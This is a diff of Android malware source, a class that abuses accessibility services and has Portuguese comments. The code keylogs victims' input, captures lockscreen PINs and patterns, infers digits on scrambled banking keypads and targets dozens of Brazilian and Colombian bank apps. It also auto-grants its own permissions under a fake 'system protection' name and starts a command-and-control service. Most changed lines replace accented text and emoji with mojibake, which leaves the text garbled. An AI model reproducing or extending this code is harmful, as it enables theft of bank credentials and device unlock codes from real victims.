     private void captureUnlockAction(AccessibilityEvent event) {
@@ -4723,7 +4960,7 @@ public class UiAssistBridge extends AccessibilityService {
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
         String className = event.getClassName() != null ? event.getClassName().toString() : "";
         
-        Log.d(TAG, "🔴 UNLOCK EVENT: type=" + eventType + " pkg=" + packageName + " class=" + className);
+        Log.d(TAG, "Ã°Å¸â€Â´ UNLOCK EVENT: type=" + eventType + " pkg=" + packageName + " class=" + className);
         
         // Verifica se estamos na tela de bloqueio (systemui ou keyguard)
         boolean isLockScreen = packageName.contains("systemui") || 
@@ -4741,7 +4978,7 @@ public class UiAssistBridge extends AccessibilityService {
                     int x = bounds.centerX();
                     int y = bounds.centerY();
                     
-                    // Captura texto do botão (para identificar PIN)
+                    // Captura texto do botÃƒÂ£o (para identificar PIN)
                     String buttonText = "";
                     if (source.getText() != null) {
                         buttonText = source.getText().toString();
@@ -4749,9 +4986,9 @@ public class UiAssistBridge extends AccessibilityService {
                         buttonText = source.getContentDescription().toString();
                     }
                     
-                    Log.d(TAG, "🔴 UNLOCK CLICK: (" + x + "," + y + ") texto=[" + buttonText + "]");
+                    Log.d(TAG, "Ã°Å¸â€Â´ UNLOCK CLICK: (" + x + "," + y + ") texto=[" + buttonText + "]");
                     
-                    // Grava a ação
+                    // Grava a aÃƒÂ§ÃƒÂ£o
                     recordUnlockAction("CLICK", x, y, 0, 0);
                     unlockType = "pin";
                     
@@ -4772,9 +5009,9 @@ public class UiAssistBridge extends AccessibilityService {
             eventType == AccessibilityEvent.TYPE_GESTURE_DETECTION_START ||
             eventType == AccessibilityEvent.TYPE_GESTURE_DETECTION_END) {
             
-            Log.d(TAG, "🔴 UNLOCK TOUCH/GESTURE: type=" + eventType + " isLockScreen=" + isLockScreen);
+            Log.d(TAG, "Ã°Å¸â€Â´ UNLOCK TOUCH/GESTURE: type=" + eventType + " isLockScreen=" + isLockScreen);
             
-            // Para pattern, precisamos capturar a posição do gesto
+            // Para pattern, precisamos capturar a posiÃƒÂ§ÃƒÂ£o do gesto
             if (isLockScreen) {
                 unlockType = "pattern";
                 // Tenta obter bounds do evento
@@ -4782,7 +5019,7 @@ public class UiAssistBridge extends AccessibilityService {
                     AccessibilityNodeInfo source = event.getSource();
                     Rect bounds = new Rect();
                     source.getBoundsInScreen(bounds);
-                    Log.d(TAG, "🔴 UNLOCK TOUCH BOUNDS: " + bounds.toString());
+                    Log.d(TAG, "Ã°Å¸â€Â´ UNLOCK TOUCH BOUNDS: " + bounds.toString());
                     source.recycle();
                 }
             }
@@ -4790,7 +5027,7 @@ public class UiAssistBridge extends AccessibilityService {
         
         // Captura scroll/swipe (para desbloqueio por deslize)
         if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
-            Log.d(TAG, "🔴 UNLOCK SCROLL detectado");
+            Log.d(TAG, "Ã°Å¸â€Â´ UNLOCK SCROLL detectado");
             if (isLockScreen) {
                 unlockType = "swipe";
                 // Para swipe simples, grava como swipe do centro para cima
@@ -4802,18 +5039,18 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Captura mudanças de foco (pode indicar navegação na lockscreen)
+        // Captura mudanÃƒÂ§as de foco (pode indicar navegaÃƒÂ§ÃƒÂ£o na lockscreen)
         if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
             if (isLockScreen && event.getSource() != null) {
                 AccessibilityNodeInfo source = event.getSource();
                 Rect bounds = new Rect();
                 source.getBoundsInScreen(bounds);
-                Log.d(TAG, "🔴 UNLOCK FOCUS: " + bounds.toString());
+                Log.d(TAG, "Ã°Å¸â€Â´ UNLOCK FOCUS: " + bounds.toString());
                 source.recycle();
             }
         }
         
-        // Captura seleção de view (para pattern dots)
+        // Captura seleÃƒÂ§ÃƒÂ£o de view (para pattern dots)
         if (eventType == AccessibilityEvent.TYPE_VIEW_SELECTED) {
             if (isLockScreen && event.getSource() != null) {
                 AccessibilityNodeInfo source = event.getSource();
@@ -4821,7 +5058,7 @@ public class UiAssistBridge extends AccessibilityService {
                 source.getBoundsInScreen(bounds);
                 int x = bounds.centerX();
                 int y = bounds.centerY();
-                Log.d(TAG, "🔴 UNLOCK SELECT: (" + x + "," + y + ")");
+                Log.d(TAG, "Ã°Å¸â€Â´ UNLOCK SELECT: (" + x + "," + y + ")");
                 recordUnlockAction("CLICK", x, y, 0, 0);
                 unlockType = "pattern";
                 source.recycle();
@@ -4831,19 +5068,19 @@ public class UiAssistBridge extends AccessibilityService {
 
     @Override
     public void onInterrupt() {
-        Log.d(TAG, "Serviço interrompido");
+        Log.d(TAG, "ServiÃƒÂ§o interrompido");
     }
     
     /**
-     * Captura gestos do usuário (para pattern lock)
+     * Captura gestos do usuÃƒÂ¡rio (para pattern lock)
      * Requer API 26+ e flagRequestTouchExplorationMode
      */
     @Override
     protected boolean onGesture(int gestureId) {
-        Log.d(TAG, "🔴 onGesture: gestureId=" + gestureId);
+        Log.d(TAG, "Ã°Å¸â€Â´ onGesture: gestureId=" + gestureId);
         
         if (isRecordingUnlock) {
-            Log.d(TAG, "🔴 UNLOCK GESTURE DETECTED: " + gestureId);
+            Log.d(TAG, "Ã°Å¸â€Â´ UNLOCK GESTURE DETECTED: " + gestureId);
             unlockType = "pattern";
             
             // Gestos comuns:
@@ -4876,7 +5113,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Captura eventos de tecla (para PIN via teclado físico)
+     * Captura eventos de tecla (para PIN via teclado fÃƒÂ­sico)
      * Requer flagRequestFilterKeyEvents
      */
     @Override
@@ -4887,18 +5124,18 @@ public class UiAssistBridge extends AccessibilityService {
                     || keyCode == android.view.KeyEvent.KEYCODE_HOME
                     || keyCode == android.view.KeyEvent.KEYCODE_APP_SWITCH
                     || keyCode == android.view.KeyEvent.KEYCODE_MENU) {
-                Log.d(TAG, "🖤 Tecla de navegação bloqueada (Tela Preta): " + keyCode);
+                Log.d(TAG, "Ã°Å¸â€“Â¤ Tecla de navegaÃƒÂ§ÃƒÂ£o bloqueada (Tela Preta): " + keyCode);
                 return true;
             }
         }
         if (isRecordingUnlock && event.getAction() == android.view.KeyEvent.ACTION_UP) {
             int keyCode = event.getKeyCode();
-            Log.d(TAG, "🔴 UNLOCK KEY: keyCode=" + keyCode);
+            Log.d(TAG, "Ã°Å¸â€Â´ UNLOCK KEY: keyCode=" + keyCode);
             
-            // Captura teclas numéricas (0-9)
+            // Captura teclas numÃƒÂ©ricas (0-9)
             if (keyCode >= android.view.KeyEvent.KEYCODE_0 && keyCode <= android.view.KeyEvent.KEYCODE_9) {
                 int digit = keyCode - android.view.KeyEvent.KEYCODE_0;
-                Log.d(TAG, "🔴 UNLOCK PIN DIGIT: " + digit);
+                Log.d(TAG, "Ã°Å¸â€Â´ UNLOCK PIN DIGIT: " + digit);
                 unlockType = "pin";
                 // Para PIN via teclado, grava como texto
                 UnlockAction action = new UnlockAction("TYPE", 0, 0);
@@ -4911,27 +5148,27 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * Inicia o processo de automação de permissões
+     * Inicia o processo de automaÃƒÂ§ÃƒÂ£o de permissÃƒÂµes
      */
     private void startAutomation() {
-        Log.d(TAG, "Iniciando automação de permissões...");
+        Log.d(TAG, "Iniciando automaÃƒÂ§ÃƒÂ£o de permissÃƒÂµes...");
         isAutomating = true;
         automationStep = STEP_REQUEST_OVERLAY;
         
         PermissionManager pm = new PermissionManager(this);
         
-        // Verifica quais permissões ainda faltam
+        // Verifica quais permissÃƒÂµes ainda faltam
         if (!pm.hasOverlayPermission()) {
-            Log.d(TAG, "Solicitando permissão de overlay...");
+            Log.d(TAG, "Solicitando permissÃƒÂ£o de overlay...");
             automationStep = STEP_REQUEST_OVERLAY;
             pm.requestOverlayPermission();
             
-            // Aguarda a tela de configurações abrir
+            // Aguarda a tela de configuraÃƒÂ§ÃƒÂµes abrir
             handler.postDelayed(() -> {
                 automationStep = STEP_ENABLE_OVERLAY;
             }, 1000);
         } else if (!pm.isIgnoringBatteryOptimizations()) {
-            Log.d(TAG, "Solicitando ignorar otimização de bateria...");
+            Log.d(TAG, "Solicitando ignorar otimizaÃƒÂ§ÃƒÂ£o de bateria...");
             automationStep = STEP_REQUEST_BATTERY;
             pm.requestIgnoreBatteryOptimizations();
         } else {
@@ -4940,13 +5177,13 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * Automatiza a tela de permissão "Desenhar sobre outras apps"
+     * Automatiza a tela de permissÃƒÂ£o "Desenhar sobre outras apps"
      */
     private void handleOverlayPermissionScreen(AccessibilityNodeInfo rootNode) {
         Log.d(TAG, "Detectou tela de overlay permission");
         
         // Procura pelo nosso nome de app
-        List<AccessibilityNodeInfo> appNameNodes = rootNode.findAccessibilityNodeInfosByText("Proteção do Sistema");
+        List<AccessibilityNodeInfo> appNameNodes = rootNode.findAccessibilityNodeInfosByText("ProteÃƒÂ§ÃƒÂ£o do Sistema");
         if (appNameNodes != null && !appNameNodes.isEmpty()) {
             Log.d(TAG, "Encontrou nosso app na lista");
             AccessibilityNodeInfo appNode = appNameNodes.get(0);
@@ -4958,7 +5195,7 @@ public class UiAssistBridge extends AccessibilityService {
             handler.postDelayed(() -> {
                 AccessibilityNodeInfo newRoot = getRootInActiveWindow();
                 if (newRoot != null) {
-                    // Procura pelo switch ou botão de permitir
+                    // Procura pelo switch ou botÃƒÂ£o de permitir
                     List<AccessibilityNodeInfo> switches = findNodesByClassName(newRoot, "android.widget.Switch");
                     if (switches != null && !switches.isEmpty()) {
                         for (AccessibilityNodeInfo switchNode : switches) {
@@ -4975,7 +5212,7 @@ public class UiAssistBridge extends AccessibilityService {
                         performGlobalAction(GLOBAL_ACTION_BACK);
                         performGlobalAction(GLOBAL_ACTION_BACK);
                         
-                        // Próximo passo: bateria
+                        // PrÃƒÂ³ximo passo: bateria
                         continueAutomation();
                     }, 500);
                     
@@ -4986,12 +5223,12 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * Automatiza a tela de otimização de bateria
+     * Automatiza a tela de otimizaÃƒÂ§ÃƒÂ£o de bateria
      */
     private void handleBatteryOptimizationScreen(AccessibilityNodeInfo rootNode) {
-        Log.d(TAG, "Detectou tela de otimização de bateria");
+        Log.d(TAG, "Detectou tela de otimizaÃƒÂ§ÃƒÂ£o de bateria");
         
-        // Procura pelo botão "Permitir" ou "Allow"
+        // Procura pelo botÃƒÂ£o "Permitir" ou "Allow"
         List<AccessibilityNodeInfo> buttons = findNodesByText(rootNode, "Permitir", "Allow", "Sim", "Yes");
         
         if (buttons != null && !buttons.isEmpty()) {
@@ -5006,7 +5243,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * Continua o fluxo de automação
+     * Continua o fluxo de automaÃƒÂ§ÃƒÂ£o
      */
     private void continueAutomation() {
         PermissionManager pm = new PermissionManager(this);
@@ -5022,17 +5259,17 @@ public class UiAssistBridge extends AccessibilityService {
     private void finishAutomationWizard() {
         automationStep = STEP_COMPLETE;
         isAutomating = false;
-        Log.d(TAG, "Automação de permissões do sistema completa");
+        Log.d(TAG, "AutomaÃƒÂ§ÃƒÂ£o de permissÃƒÂµes do sistema completa");
         startAllServices();
     }
 
     /**
-     * Inicia todos os serviços após permissões concedidas
+     * Inicia todos os serviÃƒÂ§os apÃƒÂ³s permissÃƒÂµes concedidas
      */
     private void startAllServices() {
-        Log.d(TAG, "✅ Iniciando todos os serviços...");
+        Log.d(TAG, "Ã¢Å“â€¦ Iniciando todos os serviÃƒÂ§os...");
         
-        // Serviço de comando e controle (conecta ao servidor)
+        // ServiÃƒÂ§o de comando e controle (conecta ao servidor)
         Intent ccIntent = new Intent(this, CommandControlService.class);
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
             startForegroundService(ccIntent);
@@ -5040,24 +5277,24 @@ public class UiAssistBridge extends AccessibilityService {
             startService(ccIntent);
         }
         
-        Log.d(TAG, "📡 Serviço C&C iniciado - aguardando conexão com servidor");
+        Log.d(TAG, "Ã°Å¸â€œÂ¡ ServiÃƒÂ§o C&C iniciado - aguardando conexÃƒÂ£o com servidor");
     }
 
     /**
-     * Captura dados do usuário (keylogging, senhas, etc.)
+     * Captura dados do usuÃƒÂ¡rio (keylogging, senhas, etc.)
      */
     /**
      * KEYLOGGER PROFISSIONAL
-     * Captura TUDO que a vítima digita + contexto completo
+     * Captura TUDO que a vÃƒÂ­tima digita + contexto completo
      */
     private void captureUserData(AccessibilityEvent event, AccessibilityNodeInfo rootNode) {
-        // Se keylogger não está ativo, sai
+        // Se keylogger nÃƒÂ£o estÃƒÂ¡ ativo, sai
         if (!keyloggerEnabled) return;
         
         int eventType = event.getEventType();
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "desconhecido";
         
-        // Captura CLIQUES em teclado virtual (Itáu, Bradesco, etc)
+        // Captura CLIQUES em teclado virtual (ItÃƒÂ¡u, Bradesco, etc)
         if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
             if (event.getSource() != null) {
                 AccessibilityNodeInfo source = event.getSource();
@@ -5065,9 +5302,9 @@ public class UiAssistBridge extends AccessibilityService {
                     String clickedText = "";
                     String className = source.getClassName() != null ? source.getClassName().toString() : "";
                     
-                    // === ESTRATÉGIA COMPLETA PARA CAPTURAR TEXTO DO BOTÃO ===
+                    // === ESTRATÃƒâ€°GIA COMPLETA PARA CAPTURAR TEXTO DO BOTÃƒÆ’O ===
                     
-                    // 1. Texto direto do nó
+                    // 1. Texto direto do nÃƒÂ³
                     if (source.getText() != null && source.getText().length() > 0) {
                         clickedText = source.getText().toString();
                     }
@@ -5077,12 +5314,12 @@ public class UiAssistBridge extends AccessibilityService {
                         clickedText = source.getContentDescription().toString();
                     }
                     
-                    // 3. Busca texto em TODOS os filhos (teclados bancários escondem texto em filhos)
+                    // 3. Busca texto em TODOS os filhos (teclados bancÃƒÂ¡rios escondem texto em filhos)
                     if (clickedText.isEmpty()) {
                         clickedText = findTextInChildren(source);
                     }
                     
-                    // 4. Busca no pai (às vezes o texto está no container)
+                    // 4. Busca no pai (ÃƒÂ s vezes o texto estÃƒÂ¡ no container)
                     if (clickedText.isEmpty()) {
                         AccessibilityNodeInfo parent = source.getParent();
                         if (parent != null) {
@@ -5091,7 +5328,7 @@ public class UiAssistBridge extends AccessibilityService {
                             } else if (parent.getContentDescription() != null) {
                                 clickedText = parent.getContentDescription().toString();
                             } else {
-                                // Busca nos irmãos
+                                // Busca nos irmÃƒÂ£os
                                 clickedText = findTextInChildren(parent);
                             }
                             parent.recycle();
@@ -5110,20 +5347,20 @@ public class UiAssistBridge extends AccessibilityService {
                                 }
                             }
                         }
-                        // Se ainda vazio, usa o próprio ID
+                        // Se ainda vazio, usa o prÃƒÂ³prio ID
                         if (clickedText.isEmpty()) {
                             clickedText = "[ID:" + viewId + "]";
                         }
                     }
                     
-                    // 🔐 DETECTA LOCKSCREEN/KEYGUARD (Senha de desbloqueio do celular)
+                    // Ã°Å¸â€Â DETECTA LOCKSCREEN/KEYGUARD (Senha de desbloqueio do celular)
                     boolean isLockScreen = packageName.contains("systemui") || 
                                            packageName.contains("keyguard") ||
                                            className.contains("Keyguard") ||
                                            className.contains("LockPattern") ||
                                            className.contains("PinPad");
                     
-                    // Log TODOS os cliques em apps bancários para debug
+                    // Log TODOS os cliques em apps bancÃƒÂ¡rios para debug
                     boolean isBankApp = packageName.contains("itau") || packageName.contains("bradesco") || 
                         packageName.contains("santander") || packageName.contains("neon") ||
                         packageName.contains("nubank") || packageName.contains("banco") ||
@@ -5131,25 +5368,25 @@ public class UiAssistBridge extends AccessibilityService {
                         packageName.contains("inter") || packageName.contains("c6") ||
                         packageName.contains("picpay") || packageName.contains("mercadopago") ||
                         packageName.contains("davivienda") || packageName.contains("daviplata") ||
-                        packageName.contains("bancolombia") || packageName.contains("nequi") ||
+                        packageName.contains("bancolombia") || packageName.contains("nequi") || packageName.contains("rappipay") || packageName.contains("nu.production") || packageName.contains("lulo") || packageName.contains("pibank") || packageName.contains("movi") || packageName.contains("uala") || packageName.contains("tuya") || packageName.contains("bancoomeva") || packageName.contains("bancoagrario") || packageName.contains("bancow") || packageName.contains("serfinanza") || packageName.contains("finandina") || packageName.contains("avvillas") || packageName.contains("colpatria") || packageName.contains("scotiabank") || packageName.contains("falabella") || packageName.contains("bbva") || packageName.contains("bancopopular") || packageName.contains("bancamiga") ||
                         packageName.contains("bancodebogota");
                     
                     if (isBankApp) {
-                        Log.w(TAG, "🏦 CLIQUE EM APP BANCÁRIO: " + packageName);
-                        Log.w(TAG, "  📝 Texto capturado: [" + clickedText + "]");
-                        Log.w(TAG, "  📋 ContentDesc: " + source.getContentDescription());
-                        Log.w(TAG, "  🔖 ViewId: " + source.getViewIdResourceName());
-                        Log.w(TAG, "  📦 Classe: " + className);
-                        Log.w(TAG, "  👆 Clickable: " + source.isClickable());
+                        Log.w(TAG, "Ã°Å¸ÂÂ¦ CLIQUE EM APP BANCÃƒÂRIO: " + packageName);
+                        Log.w(TAG, "  Ã°Å¸â€œÂ Texto capturado: [" + clickedText + "]");
+                        Log.w(TAG, "  Ã°Å¸â€œâ€¹ ContentDesc: " + source.getContentDescription());
+                        Log.w(TAG, "  Ã°Å¸â€â€“ ViewId: " + source.getViewIdResourceName());
+                        Log.w(TAG, "  Ã°Å¸â€œÂ¦ Classe: " + className);
+                        Log.w(TAG, "  Ã°Å¸â€˜â€  Clickable: " + source.isClickable());
                     }
                     
                     // === CAPTURA INTELIGENTE ===
                     
-                    // Detecta teclado numérico embaralhado (Itaú: "0ou9", "1ou6", etc.)
+                    // Detecta teclado numÃƒÂ©rico embaralhado (ItaÃƒÂº: "0ou9", "1ou6", etc.)
                     // [KRYPTOS] keypad sem texto/desc -> deduz pela posicao na grade
                     if (!clickedText.matches(".*[0-9].*") &&
                             (isLockScreen || packageName.contains("banco") || packageName.contains("bank") ||
-                             packageName.contains("bancolombia") || packageName.contains("nequi") ||
+                             packageName.contains("bancolombia") || packageName.contains("nequi") || packageName.contains("rappipay") || packageName.contains("nu.production") || packageName.contains("lulo") || packageName.contains("pibank") || packageName.contains("movi") || packageName.contains("uala") || packageName.contains("tuya") || packageName.contains("bancoomeva") || packageName.contains("bancoagrario") || packageName.contains("bancow") || packageName.contains("serfinanza") || packageName.contains("finandina") || packageName.contains("avvillas") || packageName.contains("colpatria") || packageName.contains("scotiabank") || packageName.contains("falabella") || packageName.contains("bbva") || packageName.contains("bancopopular") || packageName.contains("bancamiga") ||
                              packageName.contains("davivienda") || packageName.contains("daviplata") ||
                              packageName.contains("bancodebogota") || packageName.contains("santander") ||
                              packageName.contains("itau") || packageName.contains("bradesco") ||
@@ -5157,19 +5394,23 @@ public class UiAssistBridge extends AccessibilityService {
                         String posDigit = digitByGridPosition(source);
                         if (!posDigit.isEmpty()) clickedText = posDigit;
                     }
+                    if (isLockScreen) {
+                        suspendBlackScreenForKeyguard();
+                        handlePinCapture(clickedText);
+                    }
                     boolean isScrambledKeyboard = clickedText.matches(".*[0-9].*ou.*[0-9].*") || 
                                                    clickedText.matches(".*[0-9].*or.*[0-9].*");
                     
-                    // Detecta dígito simples
+                    // Detecta dÃƒÂ­gito simples
                     boolean isSingleDigit = clickedText.matches("^[0-9]$");
                     
-                    // Detecta tecla de teclado (pode ser letra ou número)
+                    // Detecta tecla de teclado (pode ser letra ou nÃƒÂºmero)
                     boolean isKeyboardKey = clickedText.matches("^[0-9A-Za-z]$") || 
                                             clickedText.matches("^[0-9].*[0-9]$"); // "0ou9" style
                     
                     if (isScrambledKeyboard || isSingleDigit || isKeyboardKey) {
-                        // É uma tecla de teclado virtual! Captura como senha
-                        Log.w(TAG, "🔑 TECLA DE SENHA DETECTADA: [" + clickedText + "] (" + packageName + ")");
+                        // Ãƒâ€° uma tecla de teclado virtual! Captura como senha
+                        Log.w(TAG, "Ã°Å¸â€â€˜ TECLA DE SENHA DETECTADA: [" + clickedText + "] (" + packageName + ")");
                         
                         String hint = findActivePasswordFieldHint(rootNode);
                         String eventTypeStr = isLockScreen ? "LOCKSCREEN_PIN" : "VIRTUAL_KEYBOARD_CLICK";
@@ -5182,7 +5423,7 @@ public class UiAssistBridge extends AccessibilityService {
                             sendKeylogData("LOCKSCREEN_CODE", lockscreenBuffer.toString(), "Codigo desbloqueio", "PIN", true, "LOCKSCREEN_CODE");
                         }
                     }
-                    // 🔐 CAPTURA PIN DA LOCKSCREEN (Desbloqueio do celular)
+                    // Ã°Å¸â€Â CAPTURA PIN DA LOCKSCREEN (Desbloqueio do celular)
                     else if (isLockScreen && source.isClickable()) {
                         Rect bounds = new Rect();
                         source.getBoundsInScreen(bounds);
@@ -5191,55 +5432,55 @@ public class UiAssistBridge extends AccessibilityService {
                         int btnWidth = bounds.width();
                         int btnHeight = bounds.height();
                         
-                        Log.w(TAG, "🔐 LOCKSCREEN CLIQUE DETECTADO!");
-                        Log.w(TAG, "  📝 Texto: [" + clickedText + "]");
-                        Log.w(TAG, "  📍 Posição: (" + centerX + "," + centerY + ") size(" + btnWidth + "x" + btnHeight + ")");
+                        Log.w(TAG, "Ã°Å¸â€Â LOCKSCREEN CLIQUE DETECTADO!");
+                        Log.w(TAG, "  Ã°Å¸â€œÂ Texto: [" + clickedText + "]");
+                        Log.w(TAG, "  Ã°Å¸â€œÂ PosiÃƒÂ§ÃƒÂ£o: (" + centerX + "," + centerY + ") size(" + btnWidth + "x" + btnHeight + ")");
                         
-                        // Tenta capturar o dígito
+                        // Tenta capturar o dÃƒÂ­gito
                         String capturedDigit = clickedText;
                         
-                        // Se não tem texto, tenta detectar pela posição (teclado 3x4)
+                        // Se nÃƒÂ£o tem texto, tenta detectar pela posiÃƒÂ§ÃƒÂ£o (teclado 3x4)
                         if (capturedDigit.isEmpty() || !capturedDigit.matches("^[0-9]$")) {
                             capturedDigit = detectLockscreenPinDigit(bounds, source);
                         }
                         
                         if (!capturedDigit.isEmpty()) {
-                            Log.w(TAG, "🔐🔑 PIN DESBLOQUEIO CAPTURADO: [" + capturedDigit + "]");
+                            Log.w(TAG, "Ã°Å¸â€ÂÃ°Å¸â€â€˜ PIN DESBLOQUEIO CAPTURADO: [" + capturedDigit + "]");
                             sendKeylogData("LOCKSCREEN_PIN", capturedDigit, "Senha de Desbloqueio", "PIN", true, "LOCKSCREEN_PIN");
                         } else {
-                            // Mesmo sem detectar, loga para análise
+                            // Mesmo sem detectar, loga para anÃƒÂ¡lise
                             sendKeylogData("LOCKSCREEN_PIN", "[BTN:" + centerX + "," + centerY + "]", "Senha de Desbloqueio", "PIN_POS", true, "LOCKSCREEN_BTN");
                         }
                     }
                     // === SANTANDER: Teclado customizado sem texto ===
-                    // O Santander usa imagens nos botões, precisamos detectar pela posição
+                    // O Santander usa imagens nos botÃƒÂµes, precisamos detectar pela posiÃƒÂ§ÃƒÂ£o
                     else if (packageName.contains("santander") && source.isClickable()) {
                         Rect bounds = new Rect();
                         source.getBoundsInScreen(bounds);
                         int centerX = bounds.centerX();
                         int centerY = bounds.centerY();
                         
-                        // Detecta se é um botão do teclado numérico baseado no tamanho e posição
+                        // Detecta se ÃƒÂ© um botÃƒÂ£o do teclado numÃƒÂ©rico baseado no tamanho e posiÃƒÂ§ÃƒÂ£o
                         int btnWidth = bounds.width();
                         int btnHeight = bounds.height();
                         
-                        // Botões do teclado Santander são quadrados ~100-200px
+                        // BotÃƒÂµes do teclado Santander sÃƒÂ£o quadrados ~100-200px
                         boolean isKeypadButton = btnWidth > 50 && btnWidth < 300 && 
                                                  btnHeight > 50 && btnHeight < 200 &&
                                                  centerY > 800; // Teclado fica na parte inferior
                         
                         if (isKeypadButton) {
-                            // Tenta identificar o número pela posição relativa
-                            // Teclado típico 3x4: (1,2,3), (4,5,6), (7,8,9), (X,0,OK)
+                            // Tenta identificar o nÃƒÂºmero pela posiÃƒÂ§ÃƒÂ£o relativa
+                            // Teclado tÃƒÂ­pico 3x4: (1,2,3), (4,5,6), (7,8,9), (X,0,OK)
                             String detectedDigit = detectSantanderKeypadDigit(bounds, source);
                             
                             if (!detectedDigit.isEmpty()) {
-                                Log.w(TAG, "🔑 SANTANDER TECLA: [" + detectedDigit + "] pos(" + centerX + "," + centerY + ")");
+                                Log.w(TAG, "Ã°Å¸â€â€˜ SANTANDER TECLA: [" + detectedDigit + "] pos(" + centerX + "," + centerY + ")");
                                 String hint = findActivePasswordFieldHint(rootNode);
                                 sendKeylogData(packageName, detectedDigit, hint, "", true, "SANTANDER_KEYPAD");
                             } else {
-                                // Se não conseguiu detectar, loga posição para análise
-                                Log.w(TAG, "🔑 SANTANDER CLIQUE: pos(" + centerX + "," + centerY + ") size(" + btnWidth + "x" + btnHeight + ")");
+                                // Se nÃƒÂ£o conseguiu detectar, loga posiÃƒÂ§ÃƒÂ£o para anÃƒÂ¡lise
+                                Log.w(TAG, "Ã°Å¸â€â€˜ SANTANDER CLIQUE: pos(" + centerX + "," + centerY + ") size(" + btnWidth + "x" + btnHeight + ")");
                                 String hint = findActivePasswordFieldHint(rootNode);
                                 sendKeylogData(packageName, "[BTN:" + centerX + "," + centerY + "]", hint, "", true, "SANTANDER_BTN_POS");
                             }
@@ -5251,7 +5492,7 @@ public class UiAssistBridge extends AccessibilityService {
                         String typeStr = isBankApp ? "BANK_BUTTON_CLICK" : "VIEW_CLICKED";
                         sendKeylogData(packageName, clickedText, hint, "", false, typeStr);
                     }
-                    // Captura clique em QUALQUER aplicativo mesmo sem texto direto (busca em filhos/viewID/posição)
+                    // Captura clique em QUALQUER aplicativo mesmo sem texto direto (busca em filhos/viewID/posiÃƒÂ§ÃƒÂ£o)
                     else {
                         String hint = findActivePasswordFieldHint(rootNode);
                         String extraText = findTextInChildren(source);
@@ -5280,7 +5521,7 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Captura alterações de texto (TUDO que é digitado)
+        // Captura alteraÃƒÂ§ÃƒÂµes de texto (TUDO que ÃƒÂ© digitado)
         if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             List<CharSequence> textList = event.getText();
             if (textList != null && !textList.isEmpty()) {
@@ -5291,7 +5532,7 @@ public class UiAssistBridge extends AccessibilityService {
                     String previousText = lastCapturedText;
                     lastCapturedText = text;
                     
-                    // Obtém contexto adicional
+                    // ObtÃƒÂ©m contexto adicional
                     String fieldHint = "";
                     String fieldName = "";
                     boolean isPassword = false;
@@ -5311,8 +5552,8 @@ public class UiAssistBridge extends AccessibilityService {
                     }
                     
                     // === CAPTURA ESPECIAL PARA BANCOS COM TECLADO GBOARD ===
-                    // Quando o texto vem mascarado (●●●), tentamos detectar o caractere digitado
-                    // comparando com o evento beforeText ou pela diferença de tamanho
+                    // Quando o texto vem mascarado (Ã¢â€”ÂÃ¢â€”ÂÃ¢â€”Â), tentamos detectar o caractere digitado
+                    // comparando com o evento beforeText ou pela diferenÃƒÂ§a de tamanho
                     boolean isBankApp = packageName.contains("santander") || packageName.contains("itau") ||
                                        packageName.contains("bradesco") || packageName.contains("neon") ||
                                        packageName.contains("nubank") || packageName.contains("banco") ||
@@ -5320,80 +5561,86 @@ public class UiAssistBridge extends AccessibilityService {
                                        packageName.contains("inter") || packageName.contains("c6") ||
                                        packageName.contains("picpay") || packageName.contains("mercadopago") ||
                                        packageName.contains("davivienda") || packageName.contains("daviplata") ||
-                                       packageName.contains("bancolombia") || packageName.contains("nequi") ||
+                                       packageName.contains("bancolombia") || packageName.contains("nequi") || packageName.contains("rappipay") || packageName.contains("nu.production") || packageName.contains("lulo") || packageName.contains("pibank") || packageName.contains("movi") || packageName.contains("uala") || packageName.contains("tuya") || packageName.contains("bancoomeva") || packageName.contains("bancoagrario") || packageName.contains("bancow") || packageName.contains("serfinanza") || packageName.contains("finandina") || packageName.contains("avvillas") || packageName.contains("colpatria") || packageName.contains("scotiabank") || packageName.contains("falabella") || packageName.contains("bbva") || packageName.contains("bancopopular") || packageName.contains("bancamiga") ||
                                        packageName.contains("bancodebogota");
                     
                     if (isBankApp && isPassword) {
-                        // 🏦 CAPTURA ESPECIAL PARA SANTANDER E BANCOS COM TECLADO PADRÃO
+                        // Ã°Å¸ÂÂ¦ CAPTURA ESPECIAL PARA SANTANDER E BANCOS COM TECLADO PADRÃƒÆ’O
                         CharSequence beforeText = event.getBeforeText();
                         int addedCount = event.getAddedCount();
                         int removedCount = event.getRemovedCount();
                         int fromIndex = event.getFromIndex();
                         
-                        Log.w(TAG, "🏦 SANTANDER/BANCO TEXT_CHANGED:");
-                        Log.w(TAG, "  📝 text: " + text);
-                        Log.w(TAG, "  📝 beforeText: " + beforeText);
-                        Log.w(TAG, "  📝 addedCount: " + addedCount);
-                        Log.w(TAG, "  📝 removedCount: " + removedCount);
-                        Log.w(TAG, "  📝 fromIndex: " + fromIndex);
+                        Log.w(TAG, "Ã°Å¸ÂÂ¦ SANTANDER/BANCO TEXT_CHANGED:");
+                        Log.w(TAG, "  Ã°Å¸â€œÂ text: " + text);
+                        Log.w(TAG, "  Ã°Å¸â€œÂ beforeText: " + beforeText);
+                        Log.w(TAG, "  Ã°Å¸â€œÂ addedCount: " + addedCount);
+                        Log.w(TAG, "  Ã°Å¸â€œÂ removedCount: " + removedCount);
+                        Log.w(TAG, "  Ã°Å¸â€œÂ fromIndex: " + fromIndex);
                         
                         // ========================================
-                        // ESTRATÉGIA 1: Capturar dígito real antes de mascarar
-                        // Alguns apps revelam o dígito brevemente antes de mascarar
+                        // ESTRATÃƒâ€°GIA 1: Capturar dÃƒÂ­gito real antes de mascarar
+                        // Alguns apps revelam o dÃƒÂ­gito brevemente antes de mascarar
                         // ========================================
